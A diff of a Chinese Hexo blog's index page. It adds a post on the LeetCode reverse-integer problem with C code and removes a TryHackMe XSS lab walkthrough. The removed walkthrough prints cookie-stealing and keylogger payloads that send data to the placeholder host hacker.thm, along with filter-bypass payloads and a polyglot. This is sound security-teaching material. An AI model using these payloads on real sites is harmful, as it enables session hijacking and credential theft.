@@ -162,6 +162,110 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/06/%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hxt.jpg">
+      <meta itemprop="name" content="hxt">
+      <meta itemprop="description" content="May the Force be with you.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hxt's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/07/06/%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/" class="post-title-link" itemprop="url">整数反转</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-07-06 16:57:26 / 修改时间：16:57:54" itemprop="dateCreated datePublished" datetime="2023-07-06T16:57:26+08:00">2023-07-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" itemprop="url" rel="index"><span itemprop="name">数据结构</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/LeetCode/" itemprop="url" rel="index"><span itemprop="name">LeetCode</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>807</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>题目地址：<a target="_blank" rel="noopener" href="https://leetcode.cn/problems/reverse-integer/">https://leetcode.cn/problems/reverse-integer/</a></p>
+<p>这算是一道简单题，我最后还是参考官方题解才做出来:cry:</p>
+<blockquote>
+<p>给你一个 32 位的有符号整数 <code>x</code> ，返回将 <code>x</code> 中的数字部分反转后的结果。</p>
+<p>如果反转后整数超过 32 位的有符号整数的范围 <code>[−231, 231 − 1]</code> ，就返回 0。</p>
+<p><strong>假设环境不允许存储 64 位整数（有符号或无符号）。</strong></p>
+<p><strong>示例 ：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x = 123</span><br><span class="line">输出：321</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>int类型表示的范围：**-2147483648** ~ <strong>2147483647</strong></p>
+<p>这里不能在算出结果后再比较结果是否溢出，因为题目要求不允许使用64位整数，即运算过程中的数字必须在32位有符号整数的范围内，所以在计算过程中可能会直接溢出报错。</p>
+<p>这里使用如下思想：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 弹出 x 的末尾数字 digit</span></span><br><span class="line">digit = x % <span class="number">10</span></span><br><span class="line">x /= <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将数字 digit 推入 rev 末尾</span></span><br><span class="line">rev = rev * <span class="number">10</span> + digit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先题目要求输入必须是32位int类型，所以不用对输入进行范围判断。假设输入正数<strong>2147483645</strong>，此时反转到最后一个数字前，<code>rev</code>的值为<strong>546384741</strong>，现在还剩最后一个数字，需要执行这句<code>rev = rev * 10 + digit</code>，但在乘以 10 时就已经溢出报错了，所以该代码不能执行，因此需要在每次循环执行<code>rev = rev * 10 + digit</code>前判断<code>rev</code>的范围是否满足：</p>
+<p>​        <strong>$⌈\frac{−2^{31}}{10}⌉≤rev≤⌊\frac{2^{31}−1}{10}⌋$</strong></p>
+<p>完整代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> t=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t&lt;INT_MIN/<span class="number">10</span> || t&gt;INT_MAX/<span class="number">10</span>)&#123; <span class="comment">//INT_MIN 和 INT_MAX 对应最大值和最小值</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        t = t*<span class="number">10</span> + x%<span class="number">10</span>;</span><br><span class="line">        x/=<span class="number">10</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/05/%E5%AF%BB%E6%89%BE%E4%B8%A4%E4%B8%AA%E6%AD%A3%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1320,248 +1424,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/28/XSS/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/hxt.jpg">
-      <meta itemprop="name" content="hxt">
-      <meta itemprop="description" content="May the Force be with you.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hxt's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/28/XSS/" class="post-title-link" itemprop="url">XSS</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-02-28 14:30:13" itemprop="dateCreated datePublished" datetime="2023-02-28T14:30:13+08:00">2023-02-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-06-10 15:53:29" itemprop="dateModified" datetime="2023-06-10T15:53:29+08:00">2023-06-10</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>7.1k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>TryHackMe实验房间：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/xssgi">https://tryhackme.com/room/xssgi</a></p>
-<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><strong>XSS</strong> 即跨站脚本攻击(Cross-Site Scripting)是一种注入攻击，将恶意的 JavaScript 语句注入到web应用程序中，使得其他用户执行该恶意代码。</p>
-<h2 id="XSS-Payloads"><a href="#XSS-Payloads" class="headerlink" title="XSS Payloads"></a>XSS Payloads</h2><p>在 XSS 中，payload 是我们希望执行在目标计算机上的 JavaScript 代码。Payload 包含两部分：intention 和 modification。</p>
-<p>Intention 就是你希望 JavaScript 代码执行的操作，而 modification 则是我们需要基于不同情况对代码的更改。</p>
-<p>下面是一些常见的 XSS intention。</p>
-<h3 id="Proof-Of-Concept（概念验证）"><a href="#Proof-Of-Concept（概念验证）" class="headerlink" title="Proof Of Concept（概念验证）"></a>Proof Of Concept（概念验证）</h3><p>利用一段简单的代码，验证和检测漏洞的存在，这样的代码叫做POC（Proof Of Concept的缩写）。</p>
-<p>这是最简单的 payload，通常是通过在web页面上弹出带有文本的警告框来实现的。例如：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Session-Stealing（session会话窃取）"><a href="#Session-Stealing（session会话窃取）" class="headerlink" title="Session Stealing（session会话窃取）"></a>Session Stealing（session会话窃取）</h3><p>用户会话的详细信息（例如登录token）通常保存在目标计算机上的 cookie 中。下面的JavaScript代码获取目标计算机的 cookie 后，使用 base64 对其进行编码以保证成功传输，然后将其发送到攻击者控制的网站上以便记录。一旦攻击者拥有这些 cookie，他们就可以接管目标的会话并作为目标用户登录。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&#x27;https://hacker.thm/steal?cookie=&#x27;</span> + <span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>));&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Key-Logger（键盘记录）"><a href="#Key-Logger（键盘记录）" class="headerlink" title="Key Logger（键盘记录）"></a>Key Logger（键盘记录）</h3><p>下面的代码充当了键盘记录器，意味着目标在网页上键入的任何内容都将被发送到黑客控制的网站。如果将该类型的 payload 被放置在目标网站上用于接收用户登录或信用卡详细信息，这可能会造成很大的损失。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123; <span class="title function_">fetch</span>(<span class="string">&#x27;https://hacker.thm/log?key=&#x27;</span> + <span class="title function_">btoa</span>(e.<span class="property">key</span>) );&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Business-Logic（业务逻辑）"><a href="#Business-Logic（业务逻辑）" class="headerlink" title="Business Logic（业务逻辑）"></a>Business Logic（业务逻辑）</h3><p>这个类型的 payload 会调用特定的网络资源或 JavaScript 函数，例如一个用于更改用户电子邮件的 JavaScript 函数<code>user.changeEmail()</code>，payload 如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;user.<span class="title function_">changeEmail</span>(<span class="string">&#x27;attacker@hacker.thm&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>现在，目标邮件地址已被更改，攻击者可以重置密码，实现攻击。</p>
-<h2 id="Types-Of-XSS"><a href="#Types-Of-XSS" class="headerlink" title="Types Of XSS"></a>Types Of XSS</h2><h3 id="Reflected-XSS（反射型XSS）"><a href="#Reflected-XSS（反射型XSS）" class="headerlink" title="Reflected XSS（反射型XSS）"></a>Reflected XSS（反射型XSS）</h3><p>当用户在HTTP请求中提供的数据未经任何验证就包含在网页源中时，就会发生反射型XSS。</p>
-<ul>
-<li><p>示例：</p>
-<p>一个网站，如果输入不符合规范的字符串，就会显示错误信息，而错误信息的内容是从查询字符串（query string）中的 <strong>error</strong> 参数获取的，并直接构建到页面源中。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110002430576.png" alt="image-20230110002430576"></p>
-<p>应用程序不检查 <strong>error</strong> 参数中的内容，使得攻击者可以插入恶意代码，如下图所示：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110002600690.png" alt="image-20230110002600690"></p>
-</li>
-<li><p>潜在影响：</p>
-<p>攻击者可以在另一个网站上发送链接或将其嵌入另一个包含JavaScript payload的网站上的 <strong>iframe</strong> 中(iframe是嵌入式框架, 是html标签, 用来在页面嵌入其他页面)，使得受害者在浏览器中执行代码，从而获取用户会话和信息。</p>
-</li>
-<li><p>如何测试反射型XSS：</p>
-<p>切入点包括：</p>
-<ol>
-<li>URL query string 中的参数</li>
-<li>URL 文件路径</li>
-<li>HTTP 头部信息</li>
-</ol>
-</li>
-</ul>
-<h3 id="Stored-XSS（存储型XSS）"><a href="#Stored-XSS（存储型XSS）" class="headerlink" title="Stored XSS（存储型XSS）"></a>Stored XSS（存储型XSS）</h3><p>顾名思义，存储型XSS的 payload 存储在web应用程序上(例如数据库)，然后在其他用户访问站点或网页时运行。</p>
-<ul>
-<li><p>示例：</p>
-<p>一个允许用户发布评论的博客网站，但是该网站并没有对评论进行过滤检查，因此可能包含恶意代码。如果我们现在发布包含JavaScript代码的评论，则会被存储在数据库，因此当其他用户访问该文章时将会在他们的浏览器上执行该JavaScript代码。</p>
-</li>
-<li><p>潜在影响：</p>
-<p>恶意的JavaScript代码可以将用户重定向到另一个网站，窃取用户的会话 cookie 或是冒充当前用户执行其他操作。</p>
-</li>
-<li><p>如何测试存储型XSS：</p>
-<p>你需要测试每个可能存储数据的入口点，并将恶意代码显示在其他用户可以看到的地方，例如：</p>
-<ol>
-<li>博客上的评论</li>
-<li>用户的个人资料信息</li>
-<li>网站列表</li>
-</ol>
-<p>有时开发人员认为在客户端上限制用户的输入值是一个好的保护方案，因此将输入值更改为web应用程序不期望的值可能会发现存储型XSS。例如，开发人员期望用户通过下拉菜单选择一个整数作为 <strong>age</strong> 的值，而我们可以尝试手动发送请求，以达到攻击的目的。</p>
-</li>
-</ul>
-<h3 id="DOM-Based-XSS（DOM型XSS）"><a href="#DOM-Based-XSS（DOM型XSS）" class="headerlink" title="DOM Based XSS（DOM型XSS）"></a>DOM Based XSS（DOM型XSS）</h3><ul>
-<li><p>DOM是什么？</p>
-<p>DOM即文档对象模型（<strong>D</strong>ocument <strong>O</strong>bject <strong>M</strong>odel），是 HTML 和 XML 文档的应用程序编程接口 (API)，它代表一个页面，以便程序可更改文档结构、样式和内容。网页是一个文档，改文档可以在浏览器窗口中显示或作为 HTML 源显示。下面是关于 HTML DOM 的图：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110111213075.png" alt="image-20230110111213075"></p>
-</li>
-<li><p>Exploiting the DOM</p>
-<p>DOM型XSS能够使得JavaScript代码直接在浏览器上执行，无需加载任何新页面或是提交数据给后端代码。当网站上的JavaScript代码用作输入或与用户交互作用时，则会执行该代码。</p>
-</li>
-<li><p>示例：</p>
-<p>假设一个网站的JavaScript代码从<code>window.location.hash</code>参数中获取内容，然后将其写入当前正在查看的页面中。如果没有检查哈希的内容是否含有恶意代码，使得攻击者可以将JavaScript代码注入当前网页中。</p>
-</li>
-<li><p>潜在影响：</p>
-<p>攻击者将精心设计的链接发送给受害者，将他们重定向到另一个网站，或从当前页面、用户会话窃取内容。</p>
-</li>
-<li><p>如何测试 DOM型 XSS：</p>
-<p>测试DOM型 XSS 是很有挑战性的，需要大量的 JavaScript 知识去阅读源代码。你需要查找攻击者可以控访问并且控制的变量 的代码部分，例如 <strong>window.location.x</strong> 参数。</p>
-<p>当你找到这些代码后，你需要查看它们是如何处理的，以及这些值是否被写入网页的 DOM 中或是传递给不安全的 JavaScript 方法(methods)，例如 <strong>eval()</strong> 。</p>
-</li>
-</ul>
-<h3 id="Blind-XSS"><a href="#Blind-XSS" class="headerlink" title="Blind XSS"></a>Blind XSS</h3><p>Blind XSS 类似于存储型XSS。攻击者的 payload 存储在网站上，供其他用户查看，但在这种情况下，攻击者无法看到 payload 的工作情况，也自行无法测试它。</p>
-<ul>
-<li><p>示例：</p>
-<p>假设网站上有一个联系表单，你可以通过该表单联系相关成员，消息内容不会被过滤和检查。这使得攻击者可以输入他们想要的任何内容，然后这些消息被转换为支持票，员工们可以在私有网站上查看，从而触发 XSS 攻击。</p>
-</li>
-<li><p>潜在影响：</p>
-<p>攻击者使用对应的payload可以将员工门户 URL 、员工的cookie信息甚至正在查看的页面内容回调给攻击者的网站。接着，攻击者可能劫持工作人员的会话并访问私有门户。</p>
-</li>
-<li><p>如何测试 Blind XSS</p>
-<p>在测试 blind XSS 漏洞时，你需要确保payload有回调(通常是 HTTP 请求)，这样你就能知道代码是否以及何时被执行。</p>
-<p>对于 blind XSS 漏洞，常用的工具是 <a target="_blank" rel="noopener" href="https://xsshunter.com/">XSShunter</a> 。你可以用 JavaScript 制作自己的工具，但该工具会自动捕获cookie、URL、页面内容等。</p>
-</li>
-</ul>
-<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="Level-One"><a href="#Level-One" class="headerlink" title="Level One"></a>Level One</h3><p>在输入框中随便输入一串字符查看结果，如下图所示：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110220357722.png" alt="image-20230110220357722"></p>
-<p>右键查看网页源代码，发现相关代码：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, hxt<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>回到初始页面，直接尝试输入 payload ：<code>&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code>，成功显示弹窗。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110220703361.png" alt="image-20230110220703361"></p>
-<h3 id="Level-Two"><a href="#Level-Two" class="headerlink" title="Level Two"></a>Level Two</h3><p>尝试输入上一关的 payload ，发现失败，查看源代码，如下：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&lt;script&gt;alert(&#x27;THM&#x27;);&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>发现输入的字符被嵌入到了<code>input</code> 标签 中，于是应该尝试闭合该标签 ，然后再运行<code>&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code>。所以最终的 payload 为**<code>&quot;&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code>**。</p>
-<h3 id="Level-Three"><a href="#Level-Three" class="headerlink" title="Level Three"></a>Level Three</h3><p>输入<code>&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code>，点击<code>Enter</code>后，查看源代码：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;THM&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>发现代码被嵌入到了<code>textarea</code> 标签 中，类似于 level two ，需要将<code>textarea</code>闭合，因此 payload 为：<code>&lt;/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;</code>。</p>
-<h3 id="Level-Four"><a href="#Level-Four" class="headerlink" title="Level Four"></a>Level Four</h3><p>步骤如上，查看源代码：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        document.getElementsByClassName(&#x27;name&#x27;)[0].innerHTML=&#x27;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;THM&#x27;</span>);</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>也是需要进行闭合处理，payload 为：<code>&#39;;alert(&#39;THM&#39;);//</code>。</p>
-<h3 id="Level-Five"><a href="#Level-Five" class="headerlink" title="Level Five"></a>Level Five</h3><p>输入代码后，查看源代码：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;&gt;</span>alert(&#x27;THM&#x27;);<span class="tag">&lt;/&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>发现<code>script</code>被过滤掉了，因此 payload 为：<code>&lt;sscriptcript&gt;alert(&#39;THM&#39;);&lt;/sscriptcript&gt;</code>。</p>
-<h3 id="Level-Six"><a href="#Level-Six" class="headerlink" title="Level Six"></a>Level Six</h3><p>输入框有默认的字符串，点击<code>Enter</code>按钮后如下图所示：</p>
-<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110225019628.png" alt="image-20230110225019628" style="zoom:67%;" />
-
-<p>源代码为：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Picture<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/images/cat.jpg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>尝试 level two 的 payload ，变化后的源代码如下：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Picture<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span><span class="attr">scriptalert</span>(&#x27;<span class="attr">THM</span>&#x27;);/<span class="attr">script</span>&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>发现<code>&lt;</code>、<code>&gt;</code>这两个符号被过滤了，为了绕过过滤器，我们可以利用<code>img</code>标签的其他属性，例如<code>onload</code>事件，一旦<code>src</code>属性中指定的图像加载到网页上，该事件将执行指定的代码。因此 payload 为：<code>/images/cat.jpg&quot; onload=&quot;alert(&#39;THM&#39;);</code>。</p>
-<p>得到flag：<code>THM&#123;XSS_MASTER&#125;</code>。</p>
-<h3 id="Polyglots"><a href="#Polyglots" class="headerlink" title="Polyglots"></a>Polyglots</h3><p>XSS polyglot 是一串文本，算是通用 payload ，可以闭合属性、闭合标签以及绕过过滤器。 你可以在刚刚完成的六个关卡中使用以下 payload，并且都会成功执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jaVasCript:/*-/*`/*\`/*&#x27;/*&quot;/**/(/* */onerror=alert(&#x27;THM&#x27;) )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert(&#x27;THM&#x27;)//&gt;\x3e</span><br></pre></td></tr></table></figure>
-
-<h3 id="Blind-XSS-1"><a href="#Blind-XSS-1" class="headerlink" title="Blind XSS"></a>Blind XSS</h3><p>在目标网站上创建新用户，然后在 <strong>Support Tickets</strong> 选项并创建新的 <strong>Ticket</strong> ，如下图所示：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110232709300.png" alt="image-20230110232709300"></p>
-<p>然后点击该 ticket 的 id 号跳转到 ticket 详情页面，查看该页面源代码，发现关键字：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-body&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Status:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> Open<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Id:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> 4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Subject:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Created:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> 10/01/2023 15:26<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Contents:<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span>hahaha<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
